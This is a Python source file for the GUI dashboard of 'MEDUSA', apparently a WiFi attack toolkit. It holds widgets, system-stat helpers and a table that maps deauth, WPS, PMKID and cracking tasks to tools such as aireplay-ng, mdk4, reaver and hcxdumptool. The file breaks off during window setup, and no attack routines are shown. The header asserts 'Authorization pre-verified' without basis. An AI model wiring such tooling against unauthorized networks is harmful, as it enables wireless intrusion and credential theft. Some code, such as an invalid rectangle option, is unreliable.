#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    MEDUSA — Queen of Brute Force                           ║
║                                                                             ║
║  medusa_dashboard.py — State-of-the-Art TKinter GUI Dashboard              ║
║                                                                             ║
║  Architecture:                                                              ║
║    • Threaded worker model with queue.Queue for non-blocking UI            ║
║    • OS-adaptive capabilities: detect and use platform-specific tools      ║
║    • ttkbootstrap theming (falls back to dark ttk if unavailable)          ║
║    • Matplotlib real-time charts embedded in TKinter canvas                ║
║    • Custom-drawn signal meters and animated widgets                       ║
║    • Lazy imports — only loads scapy/matplotlib when tabs are opened      ║
║    • Session persistence via JSON save/resume                              ║
║    • Graceful shutdown with signal handlers                                ║
║                                                                             ║
║  Tabs:                                                                      ║
║    1. DASHBOARD — Live overview, signal graph, quick actions               ║
║    2. SCAN     — Network discovery with filtering & sorting                ║
║    3. ATTACK   — Deauth, WPS, PMKID, MITM launcher                         ║
║    4. CAPTURE  — Packet capture with real-time stats                       ║
║    5. CRACK    — Hashcat / dictionary cracking with progress               ║
║    6. NETMAP   — Network topology visualization                            ║
║    7. LOGS     — Real-time log viewer with filtering                       ║
║                                                                             ║
║  Authorized Penetration Testing Platform — Authorization pre-verified      ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import re
import json
import time
import math
import queue
import atexit
import signal
import struct
import platform
import traceback
import threading
import subprocess
from pathlib import Path
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any, Callable
from collections import deque, defaultdict
from dataclasses import dataclass, field, asdict
from abc import ABC, abstractmethod

# ============================================================================
# TKinter Imports — Graceful fallbacks for headless systems
# ============================================================================

try:
    import tkinter as tk
    from tkinter import ttk, messagebox, filedialog, scrolledtext, simpledialog
    TKINTER_AVAILABLE = True
except ImportError:
    TKINTER_AVAILABLE = False

# Try ttkbootstrap for modern theming
try:
    import ttkbootstrap as ttkb
    from ttkbootstrap.constants import *
    TTKBOOTSTRAP_AVAILABLE = True
except ImportError:
    TTKBOOTSTRAP_AVAILABLE = False

# ============================================================================
# Optional visualization imports — lazy-loaded
# ============================================================================

_has_matplotlib = False
try:
    import matplotlib
    matplotlib.use('TkAgg')  # Must set before pyplot import
    from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg, NavigationToolbar2Tk
    from matplotlib.figure import Figure
    import matplotlib.pyplot as plt
    import matplotlib.animation as animation
    from matplotlib.patches import Circle, Wedge, FancyBboxPatch
    _has_matplotlib = True
except ImportError:
    pass

_has_numpy = False
try:
    import numpy as np
    _has_numpy = True
except ImportError:
    pass

# ============================================================================
# MEDUSA Core Imports
# ============================================================================

from medusa_init import (
    VERSION, CODENAME, VERSION_FULL, AUTHOR,
    SYSTEM, SYSTEM_LOWER, MACHINE, ARCH, CPU_COUNT,
    IS_WINDOWS, IS_MACOS, IS_LINUX, IS_ADMIN,
    CAN_EXTRACT_WIFI_PROFILES, CAN_MONITOR_MODE, CAN_INJECT_PACKETS,
    CAN_PIXIEDUST, CAN_HCXTOOLS, CAN_HASHCAT_GPU, CAN_HASHCAT_CPU,
    CONFIG_DIR, SESSION_DIR, CAPTURE_DIR, LOOT_DIR, LOG_DIR,
    WORDLIST_DIR, TEMP_DIR, DEFAULT_WORDLIST,
    LOGO, LOGO_COMPACT, THEME, ANSI, LOG_COLORS, BRANDING,
    MedusaError, InterfaceError, CaptureError, DeauthError,
    MITMError, CrackError, DashboardError,
    ensure_directories, current_timestamp, human_time, human_bytes,
    validate_mac, validate_ip, safe_filename, LOG_LEVELS,
)


# ============================================================================
# CONSTANTS
# ============================================================================

MAX_LOG_LINES = 10000
REFRESH_INTERVAL_MS = 1000  # 1 second default refresh
FAST_REFRESH_INTERVAL_MS = 250  # 250ms for live packet view
SIGNAL_HISTORY_SECONDS = 60  # Show last 60 seconds on signal graph
MAX_NETWORKS_DISPLAY = 200
DEFAULT_WINDOW_WIDTH = 1400
DEFAULT_WINDOW_HEIGHT = 900
MIN_WINDOW_WIDTH = 1024
MIN_WINDOW_HEIGHT = 600

# Theme colors for custom drawing (used when ttkbootstrap unavailable)
DARK_THEME = {
    'bg': '#1a1a2e',
    'fg': '#e0e0e0',
    'accent': '#e94560',
    'secondary': '#0f3460',
    'success': '#00c853',
    'warning': '#ffd600',
    'danger': '#ff1744',
    'info': '#00b0ff',
    'card_bg': '#16213e',
    'card_border': '#0f3460',
    'input_bg': '#1a1a3e',
    'hover': '#2a2a4e',
    'text_dim': '#6c757d',
    'text_bright': '#ffffff',
}

LIGHT_THEME = {
    'bg': '#f8f9fa',
    'fg': '#212529',
    'accent': '#dc3545',
    'secondary': '#6c757d',
    'success': '#28a745',
    'warning': '#ffc107',
    'danger': '#dc3545',
    'info': '#17a2b8',
    'card_bg': '#ffffff',
    'card_border': '#dee2e6',
    'input_bg': '#ffffff',
    'hover': '#e9ecef',
    'text_dim': '#6c757d',
    'text_bright': '#000000',
}

# OS-adaptive tool detection
OS_TOOLS = {
    'Linux': {
        'scan': ['iw', 'iwlist', 'nmcli'],
        'deauth': ['aireplay-ng', 'mdk4'],
        'capture': ['airodump-ng', 'tshark', 'tcpdump'],
        'crack': ['hashcat', 'aircrack-ng'],
        'wps': ['reaver', 'bully'],
        'pmkid': ['hcxdumptool', 'hcxpcapngtool'],
        'monitor': ['airmon-ng', 'iw'],
    },
    'Darwin': {
        'scan': ['airport', '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport'],
        'deauth': [],
        'capture': ['tshark', 'tcpdump'],
        'crack': ['hashcat'],
        'wps': [],
        'pmkid': ['hcxdumptool'],
        'monitor': ['airport'],
    },
    'Windows': {
        'scan': ['netsh'],
        'deauth': [],
        'capture': ['tshark', 'pktmon'],
        'crack': ['hashcat.exe'],
        'wps': [],
        'pmkid': [],
        'monitor': [],
    }
}


# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def get_os_tool(category: str) -> Optional[str]:
    """Get the best available tool for a given category on the current OS.
    
    Args:
        category: Tool category ('scan', 'deauth', 'capture', 'crack', etc.)
    
    Returns:
        Path to the best tool, or None if none available.
    """
    os_name = platform.system()
    tools = OS_TOOLS.get(os_name, {}).get(category, [])
    
    import shutil
    for tool in tools:
        path = shutil.which(tool)
        if path:
            return path
    
    # Fallback: check if tool exists as absolute path
    for tool in tools:
        if os.path.exists(tool) and os.access(tool, os.X_OK):
            return tool
    
    return None


def get_wireless_interfaces() -> List[Dict[str, Any]]:
    """Detect wireless interfaces on the current system.
    
    Returns:
        List of dicts with 'name', 'type', 'state', 'mac', 'ip' keys.
    """
    interfaces = []
    
    if IS_LINUX:
        try:
            result = subprocess.run(
                ['iw', 'dev'], capture_output=True, text=True, timeout=5
            )
            current = {}
            for line in result.stdout.split('\n'):
                stripped = line.strip()
                if stripped.startswith('Interface '):
                    if current and current.get('name'):
                        interfaces.append(current)
                    current = {'name': stripped.split()[-1], 'type': 'wireless'}
                elif 'addr' in stripped and current:
                    current['mac'] = stripped.split()[-1]
                elif 'type' in stripped and current:
                    current['type'] = stripped.split()[-1]
                elif 'channel' in stripped and current:
                    current['channel'] = int(stripped.split()[-1])
            
            if current and current.get('name'):
                interfaces.append(current)
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
    
    elif IS_WINDOWS:
        try:
            result = subprocess.run(
                ['netsh', 'wlan', 'show', 'interfaces'],
                capture_output=True, text=True, timeout=10
            )
            current = {}
            for line in result.stdout.split('\n'):
                stripped = line.strip()
                if ':' in stripped:
                    key, val = stripped.split(':', 1)
                    key = key.strip().lower()
                    val = val.strip()
                    if 'name' in key and val:
                        if current:
                            interfaces.append(current)
                        current = {'name': val, 'type': 'wireless'}
                    elif 'mac' in key or 'physical' in key:
                        current['mac'] = val
                    elif 'state' in key and current:
                        current['state'] = val.lower()
                    elif 'signal' in key and current:
                        try:
                            current['signal_pct'] = int(val.rstrip('%'))
                        except ValueError:
                            pass
                    elif 'channel' in key and current:
                        try:
                            current['channel'] = int(val)
                        except ValueError:
                            pass
            
            if current:
                interfaces.append(current)
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
    
    elif IS_MACOS:
        try:
            result = subprocess.run(
                ['/sbin/ifconfig'], capture_output=True, text=True, timeout=5
            )
            current = {}
            for line in result.stdout.split('\n'):
                stripped = line.strip()
                if stripped and stripped[0].isalpha() and ':' not in stripped[:10]:
                    if current and current.get('name'):
                        interfaces.append(current)
                    iface_name = stripped.split(':')[0]
                    if iface_name.startswith('en'):
                        current = {'name': iface_name, 'type': 'wireless'}
                    else:
                        current = {}
                elif 'ether' in stripped and current:
                    current['mac'] = stripped.split()[-1]
                elif 'inet ' in stripped and current:
                    current['ip'] = stripped.split()[1]
            
            if current and current.get('name'):
                interfaces.append(current)
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
    
    return interfaces


def get_cpu_usage() -> float:
    """Get current CPU usage percentage."""
    if IS_LINUX or IS_MACOS:
        try:
            result = subprocess.run(
                ['ps', '-A', '-o', '%cpu'], capture_output=True, text=True, timeout=3
            )
            lines = result.stdout.strip().split('\n')[1:]  # Skip header
            if lines:
                values = [float(l.strip()) for l in lines if l.strip()]
                return min(100.0, sum(values) / os.cpu_count())
        except (subprocess.TimeoutExpired, FileNotFoundError, ValueError):
            pass
    elif IS_WINDOWS:
        try:
            result = subprocess.run(
                ['wmic', 'cpu', 'get', 'loadpercentage'],
                capture_output=True, text=True, timeout=5
            )
            for line in result.stdout.split('\n'):
                try:
                    return float(line.strip())
                except ValueError:
                    continue
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
    return 0.0


def get_memory_usage() -> Dict[str, float]:
    """Get memory usage stats in GB."""
    mem = {'total': 0, 'used': 0, 'percent': 0}
    
    if IS_LINUX:
        try:
            result = subprocess.run(
                ['free', '-b'], capture_output=True, text=True, timeout=3
            )
            for line in result.stdout.split('\n'):
                if line.startswith('Mem:'):
                    parts = line.split()
                    if len(parts) >= 3:
                        total = int(parts[1])
                        used = int(parts[2])
                        mem['total'] = total / (1024**3)
                        mem['used'] = used / (1024**3)
                        mem['percent'] = (used / total) * 100
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
    
    elif IS_MACOS:
        try:
            result = subprocess.run(
                ['vm_stat'], capture_output=True, text=True, timeout=3
            )
            # Parse macOS vm_stat for memory info
            pages = {}
            for line in result.stdout.split('\n'):
                if ':' in line:
                    key, val = line.split(':', 1)
                    key = key.strip().lower()
                    val = val.strip().rstrip('.')
                    try:
                        pages[key] = int(val) * 4096 / (1024**3)  # Convert pages to GB
                    except ValueError:
                        pass
            
            if 'pages active' in pages:
                mem['used'] = pages.get('pages active', 0) + pages.get('pages wired', 0)
                mem['total'] = mem['used'] + pages.get('pages free', 0) + pages.get('pages inactive', 0)
                if mem['total'] > 0:
                    mem['percent'] = (mem['used'] / mem['total']) * 100
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
    
    elif IS_WINDOWS:
        try:
            import ctypes
            from ctypes import wintypes
            
            class MEMORYSTATUSEX(ctypes.Structure):
                _fields_ = [
                    ("dwLength", wintypes.DWORD),
                    ("dwMemoryLoad", wintypes.DWORD),
                    ("ullTotalPhys", ctypes.c_ulonglong),
                    ("ullAvailPhys", ctypes.c_ulonglong),
                    ("ullTotalPageFile", ctypes.c_ulonglong),
                    ("ullAvailPageFile", ctypes.c_ulonglong),
                    ("ullTotalVirtual", ctypes.c_ulonglong),
                    ("ullAvailVirtual", ctypes.c_ulonglong),
                    ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
                ]
            
            memory_status = MEMORYSTATUSEX()
            memory_status.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(memory_status))
            
            total_bytes = memory_status.ullTotalPhys
            avail_bytes = memory_status.ullAvailPhys
            used_bytes = total_bytes - avail_bytes
            
            mem['total'] = total_bytes / (1024**3)
            mem['used'] = used_bytes / (1024**3)
            mem['percent'] = (used_bytes / total_bytes) * 100
        except (ImportError, AttributeError):
            pass
    
    return mem


def get_disk_usage(path: str = "/") -> Dict[str, float]:
    """Get disk usage for a given path."""
    usage = {'total': 0, 'used': 0, 'free': 0, 'percent': 0}
    
    try:
        stat = os.statvfs(path) if hasattr(os, 'statvfs') else None
        if stat:
            total = stat.f_frsize * stat.f_blocks
            free = stat.f_frsize * stat.f_bavail
            used = total - free
            usage['total'] = total / (1024**3)
            usage['used'] = used / (1024**3)
            usage['free'] = free / (1024**3)
            if total > 0:
                usage['percent'] = (used / total) * 100
    except (AttributeError, OSError):
        pass
    
    # Windows fallback
    if IS_WINDOWS:
        try:
            import ctypes
            free_bytes = ctypes.c_ulonglong(0)
            ctypes.windll.kernel32.GetDiskFreeSpaceExW(
                ctypes.c_wchar_p(path), None, None, ctypes.pointer(free_bytes)
            )
            usage['free'] = free_bytes.value / (1024**3)
        except (ImportError, AttributeError):
            pass
    
    return usage


def get_system_uptime() -> str:
    """Get system uptime as a human-readable string."""
    if IS_LINUX:
        try:
            with open('/proc/uptime', 'r') as f:
                uptime_seconds = float(f.read().split()[0])
        except (IOError, OSError, IndexError, ValueError):
            return "N/A"
    elif IS_MACOS:
        try:
            result = subprocess.run(['sysctl', '-n', 'kern.boottime'],
                                    capture_output=True, text=True, timeout=3)
            # Parse: { sec = 123456, usec = 123 }
            import re
            match = re.search(r'sec\s*=\s*(\d+)', result.stdout)
            if match:
                boot_time = int(match.group(1))
                uptime_seconds = time.time() - boot_time
            else:
                return "N/A"
        except (subprocess.TimeoutExpired, FileNotFoundError, ValueError):
            return "N/A"
    elif IS_WINDOWS:
        try:
            result = subprocess.run(
                ['net', 'stat', 'workstation'],
                capture_output=True, text=True, timeout=5
            )
            # Parse "Statistics since ..."
            for line in result.stdout.split('\n'):
                if 'Statistics since' in line:
                    return line.split('since')[-1].strip()
            return "N/A"
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return "N/A"
    
    return human_time(uptime_seconds)


def get_network_traffic(interface: str = None) -> Dict[str, int]:
    """Get bytes sent/received for an interface since boot."""
    traffic = {'rx_bytes': 0, 'tx_bytes': 0, 'rx_packets': 0, 'tx_packets': 0}
    
    if IS_LINUX or IS_MACOS:
        try:
            with open(f'/sys/class/net/{interface}/statistics/rx_bytes', 'r') as f:
                traffic['rx_bytes'] = int(f.read().strip())
            with open(f'/sys/class/net/{interface}/statistics/tx_bytes', 'r') as f:
                traffic['tx_bytes'] = int(f.read().strip())
            with open(f'/sys/class/net/{interface}/statistics/rx_packets', 'r') as f:
                traffic['rx_packets'] = int(f.read().strip())
            with open(f'/sys/class/net/{interface}/statistics/tx_packets', 'r') as f:
                traffic['tx_packets'] = int(f.read().strip())
        except (IOError, OSError, FileNotFoundError):
            pass
    
    elif IS_WINDOWS:
        try:
            import ctypes
            from ctypes import wintypes
            
            # Use GetIfEntry2 for interface stats
            # Simplified: use 'netstat -e' output
            result = subprocess.run(
                ['netstat', '-e'],
                capture_output=True, text=True, timeout=5
            )
            for line in result.stdout.split('\n'):
                line = line.strip()
                if line.startswith('Bytes'):
                    parts = line.split()
                    if len(parts) >= 3:
                        try:
                            traffic['rx_bytes'] = int(parts[1].replace(',', ''))
                            traffic['tx_bytes'] = int(parts[2].replace(',', ''))
                        except ValueError:
                            pass
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
    
    return traffic


# ============================================================================
# CUSTOM WIDGETS
# ============================================================================

class SignalMeter(tk.Canvas):
    """Custom-drawn WiFi signal strength meter widget.
    
    Draws a 5-bar signal indicator animated with color gradients.
    Works without ttkbootstrap — pure Canvas rendering.
    """
    
    def __init__(self, parent: tk.Widget, width: int = 60, height: int = 30,
                 bg: str = None, **kwargs):
        """Initialize the signal meter.
        
        Args:
            parent: Parent widget
            width: Canvas width
            height: Canvas height
            bg: Background color
        """
        super().__init__(parent, width=width, height=height,
                         bg=bg or DARK_THEME['bg'],
                         highlightthickness=0, **kwargs)
        self._signal = 0  # 0-100
        self._bars = 5
        self._animating = False
        self._animation_id = None
        self.draw()
    
    def set_signal(self, value: int):
        """Set signal strength (0-100) and redraw.
        
        Args:
            value: Signal percentage (0-100)
        """
        old = self._signal
        self._signal = max(0, min(100, value))
        if abs(self._signal - old) > 2:  # Throttle redraws
            self.draw()
    
    def draw(self):
        """Draw the signal bars."""
        self.delete('all')
        w = int(self['width'])
        h = int(self['height'])
        
        bar_width = max(4, (w - 10) // self._bars)
        gap = 3
        active_bars = max(1, int((self._signal / 100) * self._bars))
        
        for i in range(self._bars):
            x = 5 + i * (bar_width + gap)
            bar_height = max(4, int((i + 1) / self._bars * (h - 8)))
            y = h - 4 - bar_height
            
            if i < active_bars:
                # Active bar — color based on signal strength
                if self._signal >= 80:
                    color = '#00c853'  # Green
                elif self._signal >= 60:
                    color = '#ffd600'  # Yellow
                elif self._signal >= 40:
                    color = '#ff9100'  # Orange
                else:
                    color = '#ff1744'  # Red
                
                # Draw filled bar with rounded corners
                self.create_rectangle(
                    x, y, x + bar_width, h - 4,
                    fill=color, outline=color, width=0
                )
            else:
                # Inactive bar
                self.create_rectangle(
                    x, y, x + bar_width, h - 4,
                    fill='#333', outline='#333', width=0
                )
    
    def animate_pulse(self):
        """Pulse animation for scanning state."""
        if self._animating:
            return
        self._animating = True
        self._pulse_step = 0
        
        def _pulse():
            if not self._animating:
                return
            active = max(1, (self._pulse_step % (self._bars + 1)))
            self._signal = int((active / self._bars) * 100)
            self.draw()
            self._pulse_step += 1
            self._animation_id = self.after(200, _pulse)
        
        _pulse()
    
    def stop_animation(self):
        """Stop pulse animation."""
        self._animating = False
        if self._animation_id:
            self.after_cancel(self._animation_id)
            self._animation_id = None


class CircularProgress(tk.Canvas):
    """Custom-drawn circular progress indicator.
    
    Draws an arc-based progress ring with percentage text.
    Useful for showing cracking/scanning progress.
    """
    
    def __init__(self, parent: tk.Widget, size: int = 100, width: int = 10,
                 bg: str = None, **kwargs):
        """Initialize circular progress.
        
        Args:
            parent: Parent widget
            size: Diameter of the circle
            width: Arc thickness
            bg: Background color
        """
        super().__init__(parent, width=size + 4, height=size + 4,
                         bg=bg or DARK_THEME['bg'],
                         highlightthickness=0, **kwargs)
        self._size = size
        self._arc_width = width
        self._progress = 0  # 0-100
        self._label = ""
        self._color = DARK_THEME['accent']
        self.draw()
    
    def set_progress(self, value: int, label: str = ""):
        """Set progress value and optional label.
        
        Args:
            value: Progress percentage (0-100)
            label: Optional text label to display
        """
        self._progress = max(0, min(100, value))
        if label:
            self._label = label
        self.draw()
    
    def set_color(self, color: str):
        """Set the progress arc color."""
        self._color = color
        self.draw()
    
    def draw(self):
        """Draw the circular progress indicator."""
        self.delete('all')
        size = self._size
        cx = cy = size // 2 + 2
        r = size // 2 - self._arc_width // 2
        
        # Background circle
        self.create_oval(
            cx - r, cy - r, cx + r, cy + r,
            outline='#333', width=self._arc_width
        )
        
        # Progress arc
        angle = (self._progress / 100) * 360
        if angle > 0:
            self.create_arc(
                cx - r, cy - r, cx + r, cy + r,
                start=90, extent=-angle,
                outline=self._color, width=self._arc_width,
                style='arc'
            )
        
        # Center text
        self.create_text(
            cx, cy - 8,
            text=f"{self._progress}%",
            fill=DARK_THEME['fg'], font=('Helvetica', 14, 'bold')
        )
        if self._label:
            self.create_text(
                cx, cy + 12,
                text=self._label,
                fill=DARK_THEME['text_dim'],
                font=('Helvetica', 8)
            )


class AnimatedButton(tk.Canvas):
    """Custom animated button with hover effects.
    
    Pure Canvas-drawn button — no ttk dependencies.
    Supports click callbacks and state changes.
    """
    
    def __init__(self, parent: tk.Widget, text: str = "",
                 width: int = 120, height: int = 32,
                 command: Callable = None, bg: str = None,
                 fg: str = None, accent: str = None,
                 font: tuple = None, **kwargs):
        """Initialize animated button.
        
        Args:
            parent: Parent widget
            text: Button label
            width: Button width
            height: Button height
            command: Click callback
            bg: Background color
            fg: Text color
            accent: Accent/hover color
            font: Font tuple (family, size, weight)
        """
        super().__init__(parent, width=width, height=height,
                         bg=bg or DARK_THEME['bg'],
                         highlightthickness=0, **kwargs)
        self._text = text
        self._command = command
        self._bg = bg or DARK_THEME['card_bg']
        self._fg = fg or DARK_THEME['fg']
        self._accent = accent or DARK_THEME['accent']
        self._font = font or ('Helvetica', 10)
        self._hovered = False
        self._disabled = False
        
        self.draw()
        self.bind('<Enter>', self._on_enter)
        self.bind('<Leave>', self._on_leave)
        self.bind('<Button-1>', self._on_click)
    
    def draw(self):
        """Draw the button."""
        self.delete('all')
        w = int(self['width'])
        h = int(self['height'])
        
        bg = self._accent if self._hovered else self._bg
        
        # Rounded rectangle background
        r = 6
        self.create_rectangle(
            1, 1, w - 1, h - 1,
            fill=bg, outline=self._accent, width=1,
            cornerradius=r
        )
        
        # Text
        self.create_text(
            w // 2, h // 2,
            text=self._text,
            fill=self._fg,
            font=self._font
        )
    
    def _on_enter(self, event):
        if not self._disabled:
            self._hovered = True
            self.draw()
            self.config(cursor='hand2')
    
    def _on_leave(self, event):
        self._hovered = False
        if not self._disabled:
            self.draw()
        self.config(cursor='')
    
    def _on_click(self, event):
        if not self._disabled and self._command:
            self._command()
    
    def set_text(self, text: str):
        """Update button text."""
        self._text = text
        self.draw()
    
    def set_disabled(self, disabled: bool):
        """Enable/disable button."""
        self._disabled = disabled
        self._hovered = False
        self.draw()


# ============================================================================
# BACKGROUND WORKER
# ============================================================================

class BackgroundWorker(threading.Thread):
    """Background worker thread for non-blocking operations.
    
    Uses queue.Queue for thread-safe communication with the UI.
    Supports cancellation and progress reporting.
    """
    
    def __init__(self, target: Callable, args: tuple = (),
                 kwargs: dict = None, name: str = "worker"):
        """Initialize worker thread.
        
        Args:
            target: Function to run in background
            args: Positional arguments for target
            kwargs: Keyword arguments for target
            name: Thread name
        """
        super().__init__(daemon=True, name=name)
        self._target_fn = target
        self._args = args
        self._kwargs = kwargs or {}
        self._cancel_flag = threading.Event()
        self._paused = threading.Event()
        self._paused.set()  # Not paused by default
        self.result_queue = queue.Queue()
        self.progress_queue = queue.Queue()
        self._exception = None
    
    def run(self):
        """Execute the target function with progress reporting."""
        try:
            # Inject progress callback
            kwargs = dict(self._kwargs)
            kwargs['_progress_cb'] = self._report_progress
            kwargs['_cancel_cb'] = self._check_cancel
            kwargs['_result_queue'] = self.result_queue
            
            result = self._target_fn(*self._args, **kwargs)
            self.result_queue.put(('done', result))
        except Exception as e:
            self._exception = e
            self.result_queue.put(('error', str(e)))
    
    def _report_progress(self, value: int, message: str = ""):
        """Report progress to UI thread.
        
        Args:
            value: Progress percentage (0-100)
            message: Optional status message
        """
        self.progress_queue.put((value, message))
    
    def _check_cancel(self) -> bool:
        """Check if the operation should be cancelled.
        
        Returns:
            True if cancellation requested.
        """
        return self._cancel_flag.is_set()
    
    def cancel(self):
        """Request cancellation."""
        self._cancel_flag.set()
    
    def pause(self):
        """Pause the operation."""
        self._paused.clear()
    
    def resume(self):
        """Resume the operation."""
        self._paused.set()
    
    @property
    def exception(self):
        return self._exception
    
    @property
    def is_cancelled(self):
        return self._cancel_flag.is_set()


# ============================================================================
# CARD FRAME — Reusable card widget
# ============================================================================

class CardFrame(tk.Frame):
    """Styled card frame with optional title and border.
    
    Mimics Bootstrap card component.
    """
    
    def __init__(self, parent: tk.Widget, title: str = "",
                 subtitle: str = "", bg: str = None,
                 border: bool = True, **kwargs):
        """Initialize card frame.
        
        Args:
            parent: Parent widget
            title: Card title text
            subtitle: Card subtitle text
            bg: Background color
            border: Whether to show border
        """
        super().__init__(parent, bg=bg or DARK_THEME['card_bg'], **kwargs)
        self._title = title
        self._subtitle = subtitle
        self._border = border
        
        if border:
            self.config(highlightbackground=DARK_THEME['card_border'],
                       highlightthickness=1, highlightcolor=DARK_THEME['card_border'])
        
        self._build()
    
    def _build(self):
        """Build the card layout."""
        # Title bar
        if self._title:
            title_frame = tk.Frame(self, bg=DARK_THEME['card_bg'])
            title_frame.pack(fill='x', padx=12, pady=(10, 2))
            
            tk.Label(
                title_frame, text=self._title,
                fg=DARK_THEME['fg'], bg=DARK_THEME['card_bg'],
                font=('Helvetica', 12, 'bold')
            ).pack(anchor='w')
            
            if self._subtitle:
                tk.Label(
                    title_frame, text=self._subtitle,
                    fg=DARK_THEME['text_dim'], bg=DARK_THEME['card_bg'],
                    font=('Helvetica', 8)
                ).pack(anchor='w')
            
            # Separator
            ttk.Separator(self, orient='horizontal').pack(
                fill='x', padx=8, pady=(4, 8)
            )
        
        # Content area
        self.content = tk.Frame(self, bg=DARK_THEME['card_bg'])
        self.content.pack(fill='both', expand=True, padx=8, pady=(0, 8))


# ============================================================================
# MAIN DASHBOARD CLASS
# ============================================================================

class MedusaDashboard:
    """MEDUSA GUI Dashboard — TKinter-based, OS-adaptive, feature-rich.
    
    Provides a complete graphical interface for all MEDUSA operations.
    Uses threading for non-blocking operations and queue-based 
    communication for thread safety.
    
    Architecture:
        MedusaDashboard
        ├── _build_menu()        — Top menu bar
        ├── _build_toolbar()     — Quick action toolbar
        ├── _build_notebook()    — Tab container
        │   ├── _build_dashboard_tab() — Live overview
        │   ├── _build_scan_tab()      — WiFi scanning
        │   ├── _build_attack_tab()    — Attack launcher
        │   ├── _build_capture_tab()   — Packet capture
        │   ├── _build_crack_tab()     — Cracking interface
        │   ├── _build_netmap_tab()    — Network topology
        │   └── _build_logs_tab()      — Log viewer
        ├── _build_statusbar()  — Status bar
        ├── _start_refresh()    — Periodic UI refresh
        └── _handle_queue()     — Thread-safe queue processing
    """
    
    def __init__(self, console=None):
        """Initialize the MEDUSA Dashboard.
        
        Args:
            console: Optional MedusaConsole instance for log integration
        """
        if not TKINTER_AVAILABLE:
            raise DashboardError("TKinter is not available on this system.")
        
        self.console = console
        self.start_time = time.time()
        self._running = True
        self._themes = {}
        self._current_theme = 'dark'
        
        # ====================================================================
        # Data stores — thread-safe with locks
        # ====================================================================
        self._data_lock = threading.RLock()
        
        # Network data
        self.networks: List[Dict] = []
        self.selected_network: Optional[Dict] = None
        self.interfaces: List[Dict] = []
        self.selected_interface: Optional[str] = None
        
        # Signal history for real-time graph
        self.signal_history: Dict[str, deque] = defaultdict(
            lambda: deque(maxlen=SIGNAL_HISTORY_SECONDS)
        )
        self.signal_timestamps: deque = deque(maxlen=SIGNAL_HISTORY_SECONDS)
        
        # Traffic history
        self.tx_history: deque = deque(maxlen=60)
        self.rx_history: deque = deque(maxlen=60)
        self.traffic_timestamps: deque = deque(maxlen=60)
        
        # Cracking state
        self.crack_progress = 0
        self.crack_status = "Idle"
        self.crack_speed = 0
        self.crack_found = False
        self.crack_password = ""
        
        # Capture state
        self.is_capturing = False
        self.capture_packets = 0
        self.capture_handshake = False
        self.capture_pmkid = False
        
        # Worker threads
        self._workers: List[BackgroundWorker] = []
        
        # Log queue (for GUI integration with console)
        self.log_queue = queue.Queue(maxsize=5000)
        self._log_buffer: List[Dict] = []
        self._log_filter = "all"
        
        # ====================================================================
        # Initialize window
        # ====================================================================
        self._init_window()
        self._build_menu()
        self._build_toolbar()
        self._build_notebook()
        self._build_statusbar()
        
        # ====================================================================
        # Start background processes
        # ====================================================================
        self._start_refresh()
        self._start_queue_processing()
        
        # Register cleanup
        atexit.register(self.cleanup)
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
        
        # Initial data load
        self.root.after(100, self._initial_load)
    
    # ========================================================================
    # WINDOW INITIALIZATION
    # ========================================================================
    
    def _init_window(self):
        """Create the main application window."""
        if TTKBOOTSTRAP_AVAILABLE:
            self.root = ttkb.Window(
                title=f"MEDUSA v{VERSION} ({CODENAME}) — {BRANDING['tagline']}",
                themename='darkly',
                resizable=(True, True),
                size=(DEFAULT_WINDOW_WIDTH, DEFAULT_WINDOW_HEIGHT),
                minsize=(MIN_WINDOW_WIDTH, MIN_WINDOW_HEIGHT),
            )
            self.style = self.root.style
            self._theme_colors = DARK_THEME
        else:
            self.root = tk.Tk()
            self.root.title(f"MEDUSA v{VERSION} ({CODENAME}) — {BRANDING['tagline']}")
            self.root.geometry(f"{DEFAULT_WINDOW_WIDTH}x{DEFAULT_WINDOW_HEIGHT}")
            self.root.minsize(MIN_WINDOW_WIDTH, MIN_WINDOW_HEIGHT)
            self._theme_colors = DARK_THEME
            
            # Dark theme configuration
            self.root.configure(bg=DARK_THEME['bg'])
            self.style = ttk.Style()
            
            # Configure ttk styles for dark theme
            self.style.theme_use('clam')
            self.style.configure('TFrame', background=DARK_THEME['bg'])
            self.style.configure('TLabel', background=DARK_THEME['bg'],
                                foreground=DARK_THEME['fg'])
            self.style.configure('TButton', background=DARK_THEME['card_bg'],
                                foreground=DARK_THEME['fg'],
                                bordercolor=DARK_THEME['card_border'])
            self.style.configure('TNotebook', background=DARK_THEME['bg'],
                                tabmargins=[2, 5, 2, 0])
            self.style.configure('TNotebook.Tab', background=DARK_THEME['card_bg'],
                                foreground=DARK_THEME['fg'],
                                padding=[12, 4])
            self.style.map('TNotebook.Tab',
                          background=[('selected', DARK_THEME['accent'])],
                          foreground=[('selected', '#ffffff')])
            self.style.configure('TLabelframe', background=DARK_THEME['bg'],
                                foreground=DARK_THEME['fg'])
            self.style.configure('TLabelframe.Label', background=DARK_THEME['bg'],
                                foreground=DARK_THEME['fg'])
            self.style.configure('THorizontal.TProgressbar',
                                background=DARK_THEME['accent'],
                                troughcolor=DARK_THEME['card_bg'])
        
        # Set icon
        try:
            if getattr(sys, 'frozen', False):
                base_path = sys._MEIPASS
            else:
                base_path = os.path.dirname(os.path.abspath(__file__))
            
            icon_path = Path(base_path) / 'assets' / 'medusa.ico'
            if icon_path.exists():
                self.root.iconbitmap(str(icon_path))
            else:
                # Try PNG icon
                png_path = Path(base_path) / 'assets' / 'medusa.png'
                if png_path.exists():
